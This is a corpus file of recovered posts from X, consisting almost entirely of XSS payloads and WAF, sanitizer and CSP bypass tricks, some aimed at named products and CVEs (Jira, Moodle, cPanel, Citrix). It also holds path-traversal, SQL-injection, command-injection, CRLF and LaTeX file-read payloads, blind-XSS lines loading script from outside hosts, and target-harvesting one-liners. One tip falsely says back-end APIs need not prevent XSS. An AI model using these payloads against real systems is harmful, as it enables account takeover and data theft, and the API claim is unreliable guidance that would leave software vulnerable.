# X 语料 · 残余回收（XSS 载荷与绕过）

来源：X 公开贴子。本轮对「非技术」桶做二次精确扫描
这些贴子含可直接执行或可直接套用的骨架（命令行 / 载荷 / 请求头 / 绕过变体），
此前按转贴、重复或「无实质」归档。回收后归入技术语料。仅纯文本，图片与外部媒体已剥离。
作者自述，未经复现验证。
同一载荷被大量转贴者只保留一份；纯玩梗、无载荷、只有提问没有答案的帖子已剔除。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[XSS](../by-type/xss.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-xss-1（300 条）、x-xss-2（300 条）、x-xss-3（266 条）、x-exp-xss（209 条） · 本文 149 行

- XSS payload that proves regex-based XSS prevention is a bad idea:
  <xmp><p title="</xmp><script>alert(0)</script>">
  Script tags not matched by the regex because it assumes it is inside a p tag, but p is not a tag as html inside xmp is text.
- <img src=X onerror=alert(0)> often works when all else fails.
- AWS WAF bypass: add "<!" before the payload.
  <!<script>confirm(1)</script>
- API TIP 27/31 — back-end servers are no longer responsible for XSS. APIs return JSON, not HTML.
  If an API returns an XSS payload such as {"name":"In<script>alert(21)</script>on"}, that is fine; protection belongs on the client side.
- XSS filter bypass using a stripped </p> tag to obfuscate (P2 stored XSS):
  <</p>iframe src=javascript:alert()//
- If the program strips all tags (e.g. <h1>, <script>) into blank, add a line feed (%0a) before the closing bracket:
  <script%0a>, </h1%0a>
  Vulnerable pattern: <?php echo "You say " . preg_replace("/<(.*?)>/", "", $_GET['x']); ?>
- Confuses WAFs into thinking the payload is an attribute value:
  <?tag x="-->" test="<img src=x onerror=alert(1)//">
- Akamai (KONA Site Defender) WAF bypass:
  <tiger/onpointerrawupdate=this['innerHTML']=unescape(location.hash);>XSS Me#<img src=x onerror=alert(0)>
- Chaining file uploads with other vulns — set the filename to:
  > ../../../tmp/lol.png for path traversal
  > sleep(10)-- -.jpg for SQLi
  > <svg onload=alert(document.domain)>.jpg/png for XSS
  > ; sleep 10; for command injection
- An XSS payload with script src for short length inputs:
  <script src=//⑮.₨></script>
- Payloads that worked for stored XSS:
  1. <img src=`xx:xx`onerror=alert(1)>
  2. <div/onmouseover='alert(1)'> style="x:">
  3. \";alert('XSS');//
  4. "autofocus/onfocus=alert(1)//
  5. '-alert(1)-'
- Jira test parameters:
  /plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
  /secure/admin/user/DeleteUser!default.jspa?name=a"><script>alert(document.cookie);</script>
- WAF bypass with double URL encoding:
  </script><script>alert('XSS here!')</script> => 403
  %253C%252Fscript%253E%253cscript%253Ealert%2528%2527XSS%2520here%2521%2527%2529%253C%252Fscript%253E => works
- XSS payload with alert obfuscation, for bypassing regex filters:
  <img src="X" onerror=top[8680439..toString(30)](1337)>
- Some of the shortest XSS payloads possible:
  1. <script/src=//⑮.rs
  2. <x/oncut=alert(1)>a
  3. <iframe src=//⑮.rs>
- DOMPurify bypass trick (version <= 2.2.3) that allows executing JS with <script> tags — needed for CSP bypass on a target that did not allow event handlers.
- Bypass event handler blacklist: onerror => block, <script> => delete, one<script>rror => allow.
- Stored XSS via Facebook / Google authentication: changed the Name to the payload javascript:void(0), then published an Ad — any visitor triggers it because the Name field stays unsanitized.
- XSS 500 Internal Server Error bypass with double URL encoding:
  <script>alert(1)</script> => 500
  %253c/ScRipt%253e%253cScript%253ealert`1`;%253c/script%253e => bypassed
- CRLF to XSS:
  CRLF: /%0AHeader:header
  XSS: /%0ASet-Cookie:"><img src=x onerror=prompt("XSS")>
- XSS payloads to keep in your notes, by WAF:
  <script>alert(1)</script> -> nginx block
  "><img src=x onerror=alert(1)> -> Wordfence block
  ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -> executed
- Ran sublist3r, found a subdomain with a search box, tried <script>alert(1)</script> — XSS. Always check for XSS when you see a search box.
- Filter observation: <sCript> is blocked but </sCript> is not — case handling in the blacklist is inconsistent.
- Moodle XSS:
  example[.]com/mod/lti/auth.php?redirect_uri=javascript:alert(1)
- Try these in every field you see:
  <img src=x onerror=prompt()>
  '">
  '" onload=prompt()>
- XSS payloads for an image filename:
  <img src=x onerror=alert('XSS')>.png
  "><img src=x onerror=alert('XSS')>.png
  "><svg onmouseover=alert(1)>.svg
  <<script>alert('xss')<!--a-->a.png
- Basic DOM XSS, same payload as always: javascript:alert(5);
- .innerHTML is a dangerous place to inject user input: it doesn't allow <script> tags to execute, but it does allow event attributes (onerror, onload, etc).
- SSTI in a Go application — try this to achieve XSS and bypass HTML sanitization:
  {{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
- Cloudflare WAF bypass for XSS:
  <script>alert(1);</script> -> blocked
  <svg on onload=(alert)(document.domain)> -> bypass
- XSS hunting one-liner:
  waybackurls http://testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
  https://github.com/R0X4R/bhedak · https://github.com/ameenmaali/urldedupe · https://github.com/ferreiraklet/airixss
- CRLF to XSS, full payload:
  %0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--
- Favorite XSS payloads:
  '"><img/src/onerror=prompt()>
  java%26Tab%3bscript:ale%26Tab%3brt()
  <iframe src=javascript:alert()//
  <s<script>cript>alert()</s<script>cript>
- Try XSS on email input fields too:
  "<img/src/onerror=alert(0)"@xss.com
- Set your android/ios device name to the BXSS payload below and enable 2FA for all applications using Authenticator/authy/okta — you might end up with blind XSS in the internal admin panel.
  "><script/src=//gujju.xss.ht>//"
- cPanel 0day reflected XSS, CVE-2023-29489:
  htt.p://example.com/cpanelwebcall/%3Cimg%20src%3Dx%20onerror%3D%22prompt%281%29%22%3Eaaaaaaaaaaaa
- LaTeX injection:
  Read file: \input{/etc/passwd}   \include{password}   # load .tex
  \usepackage{verbatim} \verbatiminput{/etc/passwd}
  XSS: \url{javascript:alert(1)}   \href{javascript:alert(1)}{placeholder}
- Citrix Gateway open redirect and XSS (CVE-2023-24488) — find with Google dorking:
  Dork: "inurl:/vpn/logout.html"
  Payload: /oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
  (the encoded form %3Cscript%3Ealert(document.cookie)%3C/script%3E works too; expect duplicates)
- 1) Reflected XSS payload: "%2F><%2Fscript><script>alert%28document.cookie%29<%2Fscript>
  2) Bypass reCAPTCHA with a null value: { "Captcha" : "test1" } => 403, { "Captcha" : "" } => 200
- Top 3 RXSS payloads:
  `'";//><img/src=x onError="${x};alert(`1`);">
  `'";//><Img Src=a OnError=location=src>
  `'";//></h1><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d"))>
- Bypass CSP with ajax.googleapis.com:
  <div ng-app><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.6/angular.min.js"></script> <input ng-focus=$event.view.alert($event.view.document.cookie)>
- Payload usable for client-side template injection and reflected XSS (code injection may fire in the background):
  '%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
- Blind XSS in the X-Forwarded-Host header:
  findomain -t TARGET.COM | gau | bxss -payload '"><script src=http://chirag.bxss.in></script>' -header "X-Forwarded-For"
- Payloads that assemble the string "xss" inline instead of the literal alert name:
  <img+src=oNlY=1+ onerror="alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))">
  <img+src=oNlY=1+ onerror="alert(['x', String.fromCharCode(121), 'x', 's'].filter(c => c.charCodeAt(0) !== 121).join(''))">
- Bypass XSS WAF protection with invisible separators before or after the function name:
  <img/src/onerror=alert&#xFEFF;(1337)>
  <svg/onload=&nbsp;alert&#65279;(2)>
- Cloudflare WAF bypass for XSS:
  "><img src=x onerrora=confirm() onerror=confirm(1)>
- WAF blocks any "</" — HTML injection with </a> still worked:
  </a<script>alert(document.cookie</script>
- Keycloak XSS: <img src=x onerror=alert(document.domain)>
- DOM XSS: #"><img src=/ onerror=alert(xss)>
- Stored XSS in a project name:
  Project Name: "><img src=x onerror=prompt(1337)>
  1. Create/login to the account
  2. Create a new project and re-edit the name with the payload
  3. Send the project creation link to the victim
- Blind XSS in an email portal leaking email logs:
  ';"/></textarea></script><script src="https://test"></script>
- Validation bypass via parameter pollution:
  https://www[.]target[.]com/safe-redirect/?url=https://example[.]com&url=javascript:print()
  (in that case a strict CSP prevented exploitation)
- HTML sanitizer bypass leading to XSS:
  '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-Click</00>--%20/
- Beyond <script>alert(1)</script> — mastering diverse XSS execution vectors.
  https://osintteam.blog/bug-bounty-bootcamp-15-beyond-script-alert-1-script-mastering-diverse-xss-execution-vectors-d4d133972725
- Found XSS with the nuclei scanner. Collect target URLs with gau, then scan them.
  payload: %3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
